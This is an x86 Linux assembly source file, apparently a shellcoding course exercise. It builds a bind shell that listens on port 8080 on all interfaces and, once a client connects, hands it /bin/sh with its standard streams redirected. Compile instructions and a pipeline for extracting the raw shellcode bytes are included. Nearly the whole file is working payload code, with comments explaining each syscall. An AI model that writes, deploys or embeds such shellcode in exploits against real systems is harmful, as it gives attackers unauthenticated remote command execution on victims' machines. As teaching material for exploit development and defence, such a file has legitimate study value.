; Author :  Alessio Parzian
; Filename: bind_shell.asm

; compile with:
; 	nasm -f elf32 bind_shell.asm
;	ld -o bind_shell bind_shell.o
; extract shellcode with:
; 	objdump -d bind_shell | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'

global _start

section .text

	_start:
		;
		; Syscall numbers for x86 can be found: /usr/include/i386-linux-gnu/asm/unistd_32.h
		;
		; ==================
		; prepare registries
		; ==================
		mov ebp,esp		 ; zeroing register
		xor eax,eax		 ; zeroing register
		xor ebx,ebx		 ; zeroing register
		xor ecx,ecx		 ; zeroing register
		xor edx,edx		 ; zeroing register
		xor esi,esi		 ; zeroing register
		; ==================
		; socket syscall
		; ==================
		; > man 2 socket 
		; int socket(int domain, int type, int protocol);
		; 	AF_INET is defined as 2 as listed in /usr/include/asm-generic/socket.h
		; 	SOCK_STREAM is defined as 1 as listed in /usr/include/asm-generic/socket.h
		; ------------------
		mov ax, 0x167 	 ; syscall number
		mov bl, 0x2		 ; AF_INET - IPv4 Internet protocols
		mov cl, 0x1		 ; SOCK_STREAM - Provides sequenced, reliable, two-way, connection-based byte streams.  An out-of-band data transmission mechanism may be supported.
						 ; edx is left to 0 as no additional flag is required to be set for our goal
		int 0x80		 ; interrupt to ask for syscall execution
		mov esi, eax	 ; save socket file descriptor to ESI register
		; ==================
		; bind syscall
		; ==================
		; > man 2 bind
		; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
		;	/usr/include/netinet/in.h
		;	struct sockaddr_in {
		;    	short            sin_family;   // e.g. AF_INET
		;    	unsigned short   sin_port;     // e.g. htons(3490)
		;    	struct in_addr   sin_addr;     // see struct in_addr, below
		;    	char             sin_zero[8];  // zero this if you want to
		;	};
		;	struct in_addr {
		;    	unsigned long s_addr;  // load with inet_aton()
		;	};
		; ------------------
		mov ax, 0x169	 ; syscall number
		mov ebx, esi	 ; move file descriptor previously created as parameter 
						 ; prepare struct sockaddr_in the stack 
		push edx 		 ; uint32_t s_addr bind (4 bytes) is left to 0x00000000, that means bind to 0.0.0.0 i.e. any interface
		push word 0x901f ; in_port_t sin_port (2 bytes) in little endian, 0x1f90 is 8080 
		push word 0x02	 ; sa_family_t sin_family (2 bytes), AF_INET - IPv4 Internet protocols
		mov ecx, esp	 ; move the address of esp as syscall parameter as a mean to access the struct just saved in the stack
		mov edx, 0x10	 ; socklen_t addrlen (16 bytes) is the size of the struct saved  
		int 0x80		 ; interrupt to ask for syscall execution
		; ==================
		; listen syscall
		; ==================
		; > man 2 listen
		; int listen(int sockfd, int backlog);
		; ------------------
		mov ax, 0x16b	 ; syscall number
		mov ebx, esi	 ; move file descriptor previously created as parameter 
		mov cl, 0x0		 ; maximum length to which the queue of pending connections for sockfd may grow
		int 0x80		 ; interrupt to ask for syscall execution
		; ==================
		; accept syscall
		; ==================
		; > man 2 accept4
		; int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
		; refer to bind syscall for insights about sockaddr struct
		; ------------------
		mov ax, 0x16c	 ; syscall number, accept4 (man 2 accept)
		mov ebx, esi	 ; move file descriptor previously created as parameter 
		xor edx, edx	 ; zeroing register
		push edx		 ; preparing enough space in the stack for struct sockaddr_in
		push edx		 ; preparing enough space in the stack for struct sockaddr_in
		mov ecx, esp	 ; move the address of esp as syscall parameter as a mean to access the empty struct just saved in the stack
		push 0x2		 ; push on the stack the size (in bytes) of the structure pointed
		mov edx, esp	 ; move the address of esp as syscall perameter as a mean to access the struct size just saved in the stack
		mov esi, 0x0	 ; flags set to 0 for ensuring normal behavior
		int 0x80		 ; interrupt to ask for syscall execution
		; ==================
		; dup2 syscall
		; ==================
		; > man 2 dup2
		; int dup2(int oldfd, int newfd);
		; ------------------
		mov ebx, eax	 ; move the file descriptor for the accepted socket as parameter
		xor ecx, ecx	 ; zeroing register
		mov cl, 0x3		 ; set counter for loop, three loops are executed for stdin, stdout, stderr
		dupin:
		    xor eax, eax ; zeroing out eax
		    mov al, 0x3f ; syscall number - dup2
		    dec cl       ; decreasing loop counter 
		    int 0x80     ; interrupt to ask for syscall execution
		    jnz dupin    ; if the zero flag is not set then do it again
		; ==================
		; execve syscall
		; ==================
		; > man 2 execve
		;  int execve(const char *filename, char *const argv[], char *const envp[]);
		; ------------------
		xor eax, eax	 ; zeroing out eax
		push eax		 ; push null byte onto the stack
		mov al, 0x0b	 ; syscall number 
		push 0x68732f6e  ; push on the stack the name of the program, /bin/sh to executed in little endian - hs/n
		push 0x69622f2f  ; push on the stack the name of the program, /bin/sh to executed in little endian - ib// (double / for padding)
		mov ebx, esp	 ; move the address of esp as syscall perameter as a mean to access the program name
		push 0x00000000  ; push on the stack a null argv
		mov edx, esp	 ; move the address of esp as syscall perameter as a mean to access the argv value
		push ebx         ; push "//bin/sh,0x00000000" back to the stack as envp 
		mov  ecx, esp    ; move the address of esp as syscall perameter as a mean to access the envp value
		int 0x80	     ; interrupt to ask for syscall execution

		







